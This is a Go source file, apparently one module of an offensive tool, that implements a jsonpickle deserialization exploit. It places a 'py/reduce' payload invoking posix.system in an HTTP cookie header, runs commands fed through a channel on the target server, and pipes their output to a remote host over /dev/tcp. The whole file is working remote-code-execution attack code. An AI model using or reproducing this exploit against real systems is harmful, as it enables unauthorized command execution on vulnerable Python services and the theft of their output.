package exploit

import (
	"fmt"
	"net/http"
	"strconv"
	"time"
)

type Jsonpickle struct {
	Exploit
}

func (e *Jsonpickle) Create(c Endpoint, payload_ch *chan string) {
	remote.Uri = c.Uri
	remote.Method = c.Method
	remote.Host = c.Host
	remote.Port = c.Port

	go func(p *chan string) {
		for {
			var cmd = <-*p
			fmt.Println("receive cmd " + cmd)
			fmt.Println("connecting to " + remote.Uri)
			client := &http.Client{
				Timeout: time.Second * 2,
			}
			go func() {
				req, _ := http.NewRequest(remote.Method, remote.Uri, nil)
				req.Header.Set("cookie", "{\"py/reduce\": [{\"py/function\": \"posix.system\"}, {\"py/tuple\": [\""+cmd+">/dev/tcp/"+remote.Host+"/"+strconv.Itoa(remote.Port)+"\"]}]}")
				client.Do(req)
				//*r <- "ok"
			}()
		}
	}(payload_ch)
}
